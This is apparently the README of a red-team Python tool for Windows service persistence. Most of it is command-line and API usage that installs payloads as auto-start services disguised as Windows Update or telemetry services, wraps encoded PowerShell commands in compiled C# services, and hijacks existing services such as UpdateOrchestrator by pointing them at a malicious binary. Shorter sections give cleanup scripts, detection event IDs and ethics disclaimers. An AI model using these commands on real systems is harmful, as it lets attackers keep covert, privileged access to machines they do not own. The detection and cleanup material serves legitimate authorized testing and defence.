## Installation
```bash
# Clone repository
git clone https://github.com/yourusername/service-persistence.git
cd service-persistence

# Install package
pip install -e .

# Or run directly
python main.py --help
```

## Usage

### Command Line Interface
```bash
# Create new service
python main.py --create C:\payload.exe --service-name WindowsUpdateService

# Create service with C# wrapper (for non-service binaries)
python main.py --create-wrapper "powershell -enc BASE64PAYLOAD"

# Create delayed-start service
python main.py --create C:\payload.exe --start-type delayed

# Modify existing service
python main.py --modify UpdateOrchestrator --new-binary C:\malicious.exe

# Scan for suspicious services
python main.py --check-suspicious

# List all services
python main.py --list

# List running services only
python main.py --list-running

# Delete service
python main.py --delete WindowsUpdateService
```

### Python API
```python
from rt_service_persistence import ServicePersistenceOrchestrator

orchestrator = ServicePersistenceOrchestrator()

# Create new service
result = orchestrator.create_service(
    payload_path=r"C:\payload.exe",
    service_name="WindowsUpdateService",
    display_name="Windows Update Service",
    description="Provides system update functionality",
    method="create",
    start_type="auto"
)

# Create wrapped service (for non-service binaries)
result = orchestrator.create_service(
    payload_command="powershell -enc BASE64PAYLOAD",
    service_name="TelemetryService",
    method="wrapper"
)

# Modify existing service
result = orchestrator.modify_service(
    service_name="UpdateOrchestrator",
    new_binary_path=r"C:\malicious.exe"
)

# Scan for suspicious services
report = orchestrator.scan_services()

# List all services
services = orchestrator.list_all_services()

# Delete service
result = orchestrator.delete_service("WindowsUpdateService")

# Cleanup all created/modified services
cleanup_results = orchestrator.cleanup_all()
```

## Service Creation Methods

### 1. Direct Service Creation
Creates a Windows service directly from a service-compatible executable:
```python
orchestrator.create_service(
    payload_path=r"C:\service.exe",
    method="create"
)
```

### 2. C# Wrapper Method
Creates a C# wrapper service that executes non-service binaries:
```python
orchestrator.create_service(
    payload_command="powershell -enc BASE64",
    method="wrapper"
)
```

### 3. Service Modification
Modifies an existing service's binary path:
```python
orchestrator.modify_service(
    service_name="ExistingService",
    new_binary_path=r"C:\malicious.exe"
)
```

## Detection Capabilities

The framework includes comprehensive detection features:

- **Suspicious Path Detection**: Identifies services in unusual locations
- **Suspicious Executable Detection**: Flags services using LOLBins
- **Command Argument Analysis**: Detects suspicious command patterns
- **Hidden Service Detection**: Finds services with suspicious naming
- **SYSTEM Service Risk Analysis**: Identifies risky privilege configurations

## Output & Cleanup

### Automatic Removal Scripts
Each service creation generates a removal batch script:
```batch
@echo off
sc stop "ServiceName"
sc delete "ServiceName"
del /f /q "C:\Users\Public\ServiceName.cs"
del /f /q "C:\Users\Public\ServiceName.exe"
```

### Restore Scripts
Service modifications generate restore scripts:
```batch
@echo off
sc stop "ServiceName"
sc config "ServiceName" binPath= "C:\original\path.exe"
sc start "ServiceName"
```

### Forensic Reports
Generate comprehensive reports of all operations:
```python
from output.removal import generate_forensic_report

report_path = generate_forensic_report(
    services_data=orchestrator.created_services
)
```

## Requirements

- **Operating System**: Windows 7+ (Windows 10/11 recommended)
- **Privileges**: Administrator rights required for service operations
- **Python**: Python 3.7+
- **.NET Framework**: Required for wrapper method (typically pre-installed)

## Security Considerations

### Legitimate Use Cases
- Security research and education
- Penetration testing (authorized)
- Red team exercises (authorized)
- Defensive security testing
- Malware analysis research

### Detection Evasion
This tool demonstrates techniques that may be detected by:
- Windows Event Logs (Service Control Manager events)
- EDR/AV solutions
- SIEM correlation rules
- Service configuration monitoring
- Binary reputation systems

### Ethical Guidelines
- Only use on systems you own or have explicit permission to test
- Document all operations for review and cleanup
- Use generated cleanup scripts to remove persistence
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

## Detection Indicators

### Event Logs
- Event ID 7045: New service installed
- Event ID 7040: Service start type changed
- Event ID 4697: Service installed (Security log)

### Suspicious Indicators
- Services in user-writable directories
- Services executing PowerShell/cmd.exe
- Services with encoded commands
- Hidden or misnamed services
- SYSTEM services with user-writable binaries

## Troubleshooting

### "Service failed to start"
- Ensure binary is service-compatible or use wrapper method
- Check binary exists at specified path
- Verify service account permissions

### "Compilation failed"
- Ensure .NET Framework is installed
- Check compiler paths in config.py
- Verify source code syntax

### "Access denied"
- Run with administrator privileges
- Check UAC settings
- Verify user has service creation rights
